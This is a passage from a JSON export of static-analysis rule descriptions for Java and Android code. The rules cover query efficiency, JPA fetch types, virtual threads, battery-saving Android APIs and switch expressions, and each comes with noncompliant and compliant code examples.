<code>java.sql.Statement</code> interface that allows to represent an SQL statement\nand to execute queries with the database.</p>\n<h2>Why is this an issue?</h2>\n<p>A common reason for a poorly performant query is because itâs processing more data than required.</p>\n<p>Querying unnecessary data demands extra work on the server, adds network overhead, and consumes memory and CPU resources on the application server.\nThe effect is amplified when the query includes multiple <em>joins</em>.</p>\n<p>The rule flags an issue when a <code>SELECT *</code> query is provided as an argument to methods in <code>java.sql.Connection</code> and\n<code>java.sql.Statement</code>.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <em>Performance</em>: the unnecessary extra data being processed brings overhead. </li>\n  <li> <em>Sustainability</em>: the extra resources used have a negative impact on the environment. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Make the <code>SELECT *</code> an explicit selection of the required fields.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class OrderRepository {\n\n    public record OrderSummary(String name, String orderId, BigDecimal price) { }\n\n    public List&lt;OrderSummary&gt; queryOrderSummaries(Connection conn) {\n            String sql = \"SELECT * \" +                                                         // Noncompliant\n                          \"FROM Orders JOIN Customers ON Orders.customerId = Customers.id \";\n\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(sql);\n\n            return convertResultToOrderSummaryList(rs);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class OrderRepository {\n\n    public record OrderSummary(String name, String orderId, BigDecimal price) { }\n\n    public List&lt;OrderSummary&gt; queryOrderSummaries(Connection conn) {\n            String sql = \"SELECT Customers.name, Orders.id, Orders.price \" +                   // Compliant\n                          \"FROM Orders JOIN Customers ON Orders.customerId = Customers.id \";\n\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(sql);\n\n            return convertResultToOrderSummaryList(rs);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.sql/java/sql/Statement.html\">Oracle SDK - Statement</a> </li>\n  <li> <a href=\"https://www.oreilly.com/library/view/high-performance-mysql/9780596101718/ch04.html\">OâReilly - High Performance MySQL - Query\n  Performance Optimization</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.geeksforgeeks.org/difference-between-execute-query-and-update-methods-in-java/\">GeeksforGeeks - Difference Between\n  Execute(), query() and Update() Methods in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6905","summary":"SQL queries should retrieve only necessary fields","tags":["sql","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p><code>FetchType</code> is an enumeration in the Java Persistence API (JPA) that is used to define the fetching strategy for associations\n(relationships) between entities in a relational database.</p>\n<p>There are two main values for FetchType:</p>\n<ul>\n  <li> <code>FetchType.EAGER</code>: the association is loaded immediately when the owning entity is loaded. </li>\n  <li> <code>FetchType.LAZY</code>: the association is not loaded unless it is explicitly accessed. </li>\n</ul>\n<p>This rule raises an issue when the <code>fetch</code> argument is explicitly set to <code>FetchType.EAGER</code>.</p>\n<h2>Why is this an issue?</h2>\n<p>Using <code>FetchType.EAGER</code> can lead to inefficient data loading and potential performance issues. Eager Loading initializes associated data\non the spot, potentially fetching more data than needed.</p>\n<h2>How to fix it</h2>\n<p>Remove or replace <code>FetchType.EAGER</code> with <code>FetchType.LAZY</code> in JPA annotations.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@OneToMany(mappedBy = \"parent\", fetch = FetchType.EAGER) // Noncompliant\nprivate List&lt;ChildEntity&gt; children;\n\n@OneToMany(mappedBy = \"child\", fetch = FetchType.EAGER) // Noncompliant\nprivate List&lt;ParentEntity&gt; parents;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@OneToMany(mappedBy = \"parent\", fetch = FetchType.LAZY) // Compliant\nprivate List&lt;ChildEntity&gt; children;\n\n@OneToMany(mappedBy = \"child\") // Compliant\nprivate List&lt;ParentEntity&gt; parents;\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/persistence/FetchType.html\">Java EE 7 API - FetchType</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6904","summary":"Avoid using \"FetchType.EAGER\"","tags":["sustainability","jpa","sql"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Thread</code> class has some methods that are used to monitor and manage its execution. With the introduction of virtual threads in Java\n21, there are three of these methods that behave differently between the standard platform threads and the virtual ones.</p>\n<p>For virtual threads:</p>\n<ul>\n  <li> <code>Thread.setDaemon(boolean)</code> will throw an <code>IllegalArgumentException</code> if <code>false</code> is passed as an argument as a\n  virtual thread daemon status is always true. </li>\n  <li> <code>Thread.setPriority(int priority)</code> will never change the actual priority of a virtual thread, which is always equal to\n  <code>Thread.NORM_PRIORITY</code> </li>\n  <li> <code>Thread.getThreadGroup()</code> will return a dummy \"VirtualThreads\" group that is empty and should not be used </li>\n</ul>\n<p>This rule reports an issue when one of these methods is invoked on a virtual thread.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nThread t = Thread.ofVirtual().unstarted(()-&gt;{/* some task */});\nt.setPriority(1); // Noncompliant; virtual threads' priority cannot be changed\nt.setDaemon(false); // Noncompliant; will throw IllegalArgumentException\nt.setDaemon(true); // Noncompliant; redundant\nt.start();\nvar threadGroup = t.getThreadGroup(); // Noncompliant; virtual thread groups should not be used\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Thread.html#setDaemon(boolean)\">Thread.setDaemon</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Thread.html#setPriority(int)\">Thread.setPriority</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Thread.html#getThreadGroup()\">Thread.getThreadGroup</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ThreadGroup.html#virtualthreadgroup\">Virtual threads group</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6901","summary":"\"setDaemon\", \"setPriority\" and \"getThreadGroup\" should not be invoked on virtual threads","tags":["java21","bug"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <em>Frame Rate API</em> allows applications to communicate their desired frame rate to the <em>Android platform</em> to enhance the user\nexperience. The API is useful since many devices now offer varying refresh rates like 60Hz, 90Hz, or 120Hz.</p>\n<h2>Why is this an issue?</h2>\n<p>Standard applications donât require a display refresh rate above 60Hz, hence it is advisable to avoid higher frequencies to avoid unnecessary\nenergy consumption.</p>\n<p>The rule flags an issue when <code>setFrameRate()</code> is invoked with a frameRate higher than 60Hz for <code>android.view.Surface</code> and\n<code>android.view.SurfaceControl.Transaction</code>.</p>\n<p>Itâs important to note that the scheduler considers several factors when determining the display refresh rate. Therefore, using\n<code>setFrameRate()</code> doesnât guarantee your app will achieve the requested frame rate.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <em>Usability</em>: the device may run out of battery faster than expected. </li>\n  <li> <em>Sustainability</em>: the extra battery usage has a negative impact on the environment. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Use a frame rate of maximum 60Hz, unless you have a strong reason to used higher rates. Valid exceptions are <em>gaming apps</em>, especially those\nwith fast-paced action or high-quality graphics, or <em>AR/VR apps</em>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        SurfaceView surfaceView = findViewById(R.id.my_surface_view);\n        Surface surface = surfaceView.getHolder().getSurface();\n\n        surface.setFrameRate(90.0f, Surface.FRAME_RATE_COMPATIBILITY_FIXED_SOURCE); // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        SurfaceView surfaceView = findViewById(R.id.my_surface_view);\n        Surface surface = surfaceView.getHolder().getSurface();\n\n        surface.setFrameRate(60.0f, Surface.FRAME_RATE_COMPATIBILITY_FIXED_SOURCE); // Compliant\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://developer.android.com/media/optimize/performance/frame-rate\">Android for Developers: Frame Rate</a> </li>\n  <li> <a\n  href=\"https://developer.apple.com/library/archive/documentation/3DDrawing/Conceptual/MTLBestPracticesGuide/FrameRate.html#//apple_ref/doc/uid/TP40016642-CH23-SW1\">Developer Apple - Frame Rate</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6898","summary":"High frame rates should not be used","tags":["android","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>The <code>AlarmManager</code> class provides access to the system alarm services. It allows you to schedule your application to run at some point\nin the future, even when itâs not active.</p>\n<p>From API 19 onwards, the alarm delivery is inexact in order to save battery life. The Android OS now batches together alarms from all apps that\noccur at reasonably similar times so the system wakes the device once instead of several times to handle each alarm.</p>\n<p>It is possible to use exact alarms with <code>setExact</code>, <code>setExactAndAllowWhileIdle</code>, <code>setWindow</code> and\n<code>setAlarmClock</code>. Exact alarms should be used only when strict delivery guarantees are required, for example for an alarm clock application\nor for calendar notifications.</p>\n<p>The rule raises an issue when an exact alarm is set, or when a window is set to less than 10 minutes.</p>\n<h2>Why is this an issue?</h2>\n<p>The use of exact alarms triggers the device to wake up at precise times that can lead several wake-ups in a short period of time. The wake-up\nmechanism is a significant battery drain because it requires powering up the main processor and pulling it out of a low-power state.</p>\n<p>Itâs highly recommended to create an inexact alarm whenever possible.</p>\n<p>It is also recommended for normal timing operations, such as ticks and timeouts, using the <code>Handler</code>, and for long-running operations,\nsuch as network downloads, using <code>WorkManager</code> or <code>JobScheduler</code>.</p>\n<h3>What is the potential impact?</h3>\n<ul>\n  <li> <em>Usability</em>: the device may run out of battery faster than expected. </li>\n  <li> <em>Sustainability</em>: the extra battery usage has a negative impact on the environment. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Replace occurrences of <code>setExact</code> with <code>set</code> and <code>setExactAndAllowWhileIdle</code> with\n<code>setAndAllowWhileIdle</code>, and avoid to use <code>setWindow</code> with a window less than 10 minutes.</p>\n<p>Alternatively, consider using <code>Handler</code>, <code>WorkManager</code> or <code>JobScheduler</code> instead of <code>AlarmManager</code> when\npossible, depending on your use case.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class AlarmScheduler {\n    private Context context;\n\n    public AlarmScheduler(Context context) {\n        this.context = context;\n    }\n\n    public void scheduleAlarm(long triggerTime) {\n        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);\n        Intent intent = new Intent(context, AlarmReceiver.class);\n        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);\n\n        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent); // Noncompliant, avoid using exact alarms unless necessary\n        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent); // Noncompliant, avoid using exact alarms unless necessary\n\n        long windowLengthMillis = 5 * 60 * 1000; // 5 minutes in milliseconds\n        alarmManager.setWindow(AlarmManager.RTC_WAKEUP, triggerTime, windowLengthMillis, pendingIntent); // Noncompliant, don't use windows below 10 minutes\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class AlarmScheduler {\n    private Context context;\n\n    public AlarmScheduler(Context context) {\n        this.context = context;\n    }\n\n    public void scheduleAlarm(long triggerTime) {\n        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);\n        Intent intent = new Intent(context, AlarmReceiver.class);\n        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);\n\n        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent); // Compliant\n        alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);  // Compliant\n\n        long windowLengthMillis = 10 * 60 * 1000; // 10 minutes in milliseconds\n        alarmManager.setWindow(AlarmManager.RTC_WAKEUP, triggerTime, windowLengthMillis, pendingIntent); // Compliant\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://developer.android.com/reference/android/app/AlarmManager\">Android for Developers - AlarmManager</a> </li>\n  <li> <a href=\"https://developer.android.com/about/versions/kitkat/android-4.4\">Android for Developers - AlarmManager with SDK Version 19</a> </li>\n  <li> <a href=\"https://developer.android.com/develop/background-work/services/alarms/schedule#exact-acceptable-use-cases\">Android for Developers -\n  Schedule alarms</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/os/Handler\">Android for Developers - Handler</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/androidx/work/WorkManager\">Android for Developers - WorkManager</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/app/job/JobScheduler\">Android for Developers - JobScheduler</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6891","summary":"Exact alarms should not be abused","tags":["java","android","sustainability"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Optimizing resource usage and preventing unnecessary battery drain are critical considerations in Android development. Failing to release sensor\nresources when they are no longer needed can lead to prolonged device activity, negatively impacting battery life. Common Android sensors, such as\ncameras, GPS, and microphones, provide a method to release resources after they are not in use anymore.</p>\n<p>This rule identifies situations where a sensor is not released after being utilized, helping developers maintain efficient and battery-friendly\napplications.</p>\n<ul>\n  <li> Missing call to <code>release()</code> method:\n    <ul>\n      <li> <code>android.os.PowerManager.WakeLock</code> </li>\n      <li> <code>android.net.wifi.WifiManager$MulticastLock</code> </li>\n      <li> <code>android.hardware.Camera</code> </li>\n      <li> <code>android.media.MediaPlayer</code> </li>\n      <li> <code>android.media.MediaRecorder</code> </li>\n      <li> <code>android.media.SoundPool</code> </li>\n      <li> <code>android.media.audiofx.Visualizer</code> </li>\n      <li> <code>android.hardware.display.VirtualDisplay</code> </li>\n    </ul>  </li>\n  <li> Missing call to <code>close()</code> method\n    <ul>\n      <li> <code>android.hardware.camera2.CameraDevice</code> </li>\n    </ul>  </li>\n  <li> Missing call to <code>removeUpdates()</code> method:\n    <ul>\n      <li> <code>android.location.LocationManager</code> </li>\n    </ul>  </li>\n  <li> Missing call to <code>unregisterListener()</code> method:\n    <ul>\n      <li> <code>android.hardware.SensorManager</code> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Ensure that resources are released when they are no longer needed. This can be done by calling the appropriate release method, such as\n<code>release()</code>, <code>removeUpdates()</code>, <code>unregisterListener()</code>, or <code>stop()</code>.</p>\n<h3>Code examples</h3>\n<ul>\n  <li> <code>android.os.PowerManager.WakeLock</code> </li>\n</ul>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void method() {\n  PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);\n  PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"My Wake Lock\");\n  wakeLock.acquire(); // Noncompliant\n  // do some work...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void method() {\n  PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);\n  PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"My Wake Lock\");\n  wakeLock.acquire(); // Compliant\n  // do some work...\n  wakeLock.release();\n}\n</pre>\n<ul>\n  <li> <code>android.media.MediaPlayer</code> </li>\n</ul>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic void method() {\n  MediaPlayer mediaPlayer = MediaPlayer.create(context, R.raw.sound_file_1);\n  mediaPlayer.start(); // Noncompliant\n  // do some work...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic void onCreate() {\n  MediaPlayer mediaPlayer = MediaPlayer.create(context, R.raw.sound_file_1);\n  mediaPlayer.start(); // Compliant\n  // do some work...\n  wakeLock.release();\n}\n</pre>\n<ul>\n  <li> <code>android.hardware.SensorManager</code> </li>\n</ul>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\npublic void method() {\n  SensorManager sensorManager = getSystemService(SENSOR_SERVICE);\n  Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);\n  sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL); // Noncompliant\n  // do some work...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\npublic void method() {\n  SensorManager sensorManager = getSystemService(SENSOR_SERVICE);\n  Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);\n  sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL); // Compliant\n  // do some work...\n  sensorManager.unregisterListener(this);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://developer.android.com/reference/android/location/LocationManager\">Android - LocationManager</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/os/PowerManager.WakeLock\">Android - PowerManager.WakeLock</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/net/wifi/WifiManager.MulticastLock\">Android - WifiManager.MulticastLock</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/media/projection/MediaProjection\">Android - MediaProjection</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/media/MediaPlayer\">Android - MediaPlayer</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/media/MediaRecorder\">Android - MediaRecorder</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/media/SoundPool\">Android - SoundPool</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/media/audiofx/Visualizer\">Android - Visualizer</a> </li>\n  <li> <a href=\"https://developer.android.com/reference/android/hardware/SensorManager\">Android - SensorManager</a> </li>\n  <li> <a href=\"https://developer.android.com/develop/background-work/background-tasks/scheduling/wakelock\">Android - Keep the device awake</a> </li>\n  <li> <a href=\"https://developer.android.com/media/platform/mediaplayer\">Android - MediaPlayer Overview</a> </li>\n  <li> <a href=\"https://developer.android.com/develop/sensors-and-location/sensors/sensors_overview\">Android - Sensors Overview</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6889","summary":"Proper Sensor Resource Management","tags":["sustainability","android","leak"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java 21 the <code>java.lang.Math</code> class was updated with the static method <code>Math.clamp</code>, to clamp a numerical value between a\nmin and a max value.</p>\n<p>Using this built-in method is now the preferred way to restrict to a given interval, as it is more readable and less error-prone.</p>\n<h2>How to fix it</h2>\n<p>Replace your clamp method implementation with the <code>Math.clamp</code> method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint clampedValue = value &gt; max ? max : value &lt; min ? min : value; // Noncompliant; Replace with \"Math.clamp\"\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nint clampedValue = Math.max(min, Math.min(max, value)); // Noncompliant; Replace with \"Math.clamp\"\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint clampedValue = Math.clamp(value, min, max);\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint clampedValue = Math.clamp(value, min, max);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6885","summary":"Use built-in \"Math.clamp\" methods","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>With the introduction of virtual threads in Java 21, it is now possible to optimize the usage of the operating system threads by avoiding blocking\nthem for asynchronous operations. Furthermore, virtual threadsâs instantiation has very little overhead and they can be created in large quantities.\nThis means that it can be more efficient to use them over the default platform threads for tasks that involve I/O or some other blocking\noperations.</p>\n<h2>Why is this an issue?</h2>\n<p>Whenever a virtual thread is started, the JVM will mount it on an OS thread. As soon as the virtual thread runs into a blocking operation like an\nHTTP request or a filesystem read/write operation, the JVM will detect this and unmount the virtual thread. This allows another virtual thread to take\nover the OS thread and continue its execution.</p>\n<p>This is why virtual threads should be preferred to platform threads for tasks that involve blocking operations. By default, a Java thread is a\nplatform thread. To use a virtual thread it must be started either with <code>Thread.startVirtualThread(Runnable)</code> or\n<code>Thread.ofVirtual().start(Runnable)</code>.</p>\n<p>This rule raises an issue when a platform thread is created with a task that includes heavy blocking operations.</p>\n<h2>How to fix it</h2>\n<p>Replace platform thread instances or platform thread pools with virtual threads, if their task involves blocking operations.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following example creates a platform thread to handle a blocking operation, here denoted by <code>Thread.sleep(1000)</code>. The overhead for\ninstantiating a platform thread is higher than for a virtual thread. Further, instantiating too many platform threads can lead to problems if the\nnumber of instantiated threads exceeds the maximum number of platform threads allowed by the OS.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nnew Thread(() -&gt; {\n    try {\n        Thread.sleep(1000); // Noncompliant blocking operation in platform thread\n    } catch (InterruptedException e) {\n        throw new RuntimeException(e);\n    }\n});\n</pre>\n<p>In the context of thread pools, using platform threads for heavy blocking operations can lead to the thread pool running out of available threads.\nEven though the threads spend most of their time waiting for e.g. I/O operations to complete and subsequently the CPU usage is low, the application\ncannot continue processing efficiently, due to the lack of available threads.</p>\n<h4>Compliant solution</h4>\n<p>Using virtual threads allows the developer to abstract from any pooling logic as they are much lighter than platform threads, and the number of\nvirtual threads that can be instantiated is only limited by the available memory. In this example, the execution of 10000 requests would take just\nover ~1 second without any risk of exceeding the allowed number of platform threads.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nThread.ofVirtual().start(() -&gt; {\n    try {\n        Thread.sleep(1000); // Compliant\n    } catch (InterruptedException e) {\n        throw new RuntimeException(e);\n    }\n});\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/21/core/virtual-threads.html\">Virtual Threads</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Thread.html#startVirtualThread(java.lang.Runnable)\">Thread.startVirtualThread(Runnable)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6881","summary":"Virtual threads should be used for tasks that include heavy blocking operations","tags":["java21","multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Comparing a variable to multiple cases is a frequent operation. This can be done using a sequence of if-else statements. However, for many cases\nlike enums or simple value comparisons, a <code>switch</code> statement is the better alternative. With Java 21, the <code>switch</code> statement has\nbeen significantly improved to support pattern matching and record pattern.</p>\n<p>Using a <code>switch</code> statement instead of an if-else chain provides benefits like clearer code, certainty of covering all cases, and may\neven improve performance.</p>\n<p>This rule raises an issue when an if-else chain should be replaced by a <code>switch</code> statement.</p>\n<h2>How to fix it</h2>\n<p>Replace the chain of if-else with a switch expression.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nsealed interface Expression {}\nrecord Plus(Expression left, Expression right) implements Expression {}\nrecord Minus(Expression left, Expression right) implements Expression {}\nrecord Div(Expression left, Expression right) implements Expression {}\n\nint eval(Expression expr){\n  if(expr instanceof Plus plus){ // Noncompliant; should be replaced by a switch expression\n    return eval(plus.left) + eval(plus.right);\n  }else if(expr instanceof Div div){\n    return eval(div.left) / eval(div.right);\n  }else if(expr instanceof Minus minus){\n    return eval(minus.left) - eval(minus.right);\n  } else {\n    throw new IllegalArgumentException(\"Unknown expression\");\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nenum Color{RED,GREEN,YELLOW}\n\nString name(Color c){\n  if(c == Color.RED){ // Noncompliant; should be replaced by a switch expression\n    return \"red\";\n  }else if(c == Color.GREEN){\n    return \"green\";\n  }else if(c == Color.YELLOW){\n    return \"yellow\";\n  }else{\n    throw new IllegalArgumentException(\"Unknown color\");\n  }\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nint points(int result){\n  if(result == 2){ // Noncompliant; should be replaced by a switch expression\n    return 10;\n  } else if(result == 3 || result==4 ){\n    return 20;\n  } else if (result == 5) {\n    return 50;\n  }else{\n    return 0;\n  }\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nclass Circle{}\nclass Rectangle{}\nclass Square{}\n\nString name(Object shape){\n  if (shape instanceof Circle) { // Noncompliant; should be replaced by a switch expression\n    return \"circle\";\n  } else if (shape instanceof Rectangle) {\n     return \"rectangle\";\n  } else if (shape instanceof Square) {\n    return \"square\";\n  } else {\n    throw new IllegalArgumentException();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nsealed interface Expression {}\nrecord Plus(Expression left, Expression right) implements Expression {}\nrecord Minus(Expression left, Expression right) implements Expression {}\nrecord Div(Expression left, Expression right) implements Expression {}\n\nint eval(Expression expr){\n  return switch(expr){\n    case Div(var left, var right) -&gt; eval(left) / eval(right);\n    case Plus(var left, var right) -&gt; eval(left) + eval(right);\n    case Minus(var left, var right) -&gt; eval(left) - eval(right);\n  };\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nenum Color{RED,GREEN,YELLOW}\nString name(Color c){\n  return switch(c){\n    case RED -&gt; \"red\";\n    case GREEN -&gt; \"green\";\n    case YELLOW -&gt; \"yellow\";\n  };\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nint points(int result){\n  return switch(result){\n    case 2 -&gt; 10;\n    case 3,4 -&gt; 20;\n    case 5 -&gt; 50;\n    default -&gt; 0;\n  };\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nclass Circle{}\nclass Rectangle{}\nclass Square{}\n\nString name(Object shape){\n  return switch(shape){\n    case Circle c -&gt; \"circle\";\n    case Rectangle r -&gt; \"rectangle\";\n    case 